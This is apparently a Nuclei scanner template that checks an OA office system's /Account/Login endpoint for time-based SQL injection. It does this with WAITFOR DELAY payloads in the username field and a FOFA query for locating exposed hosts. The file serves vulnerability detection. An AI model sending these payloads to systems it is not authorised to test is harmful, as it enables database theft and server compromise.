http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          username=1');WAITFOR+DELAY+'0:0:4'--&password=1&RememberMe=false
        - |
          POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          username=1');WAITFOR+DELAY+'0:0:8'--&password=1&RememberMe=false
id: zhongzhiOA-Account_Login-sql
info:
    author: Superhero
    description: |-
        fofa: body="/Account/Login?ACT=Index"
        众智OA办公系统 Account/Login 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 众智OA办公系统 Account/Login SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487927&idx=1&sn=248aa658c18d851ba5899dce03bd0e0f&chksm=c267a484f5102d92d104970c676bbd35b2627aecd82baa0b76a9f15482578488245046b21046&token=48786214&lang=zh_CN#rd
    severity: high
    tags:
        - 众智OA
        - Ioa
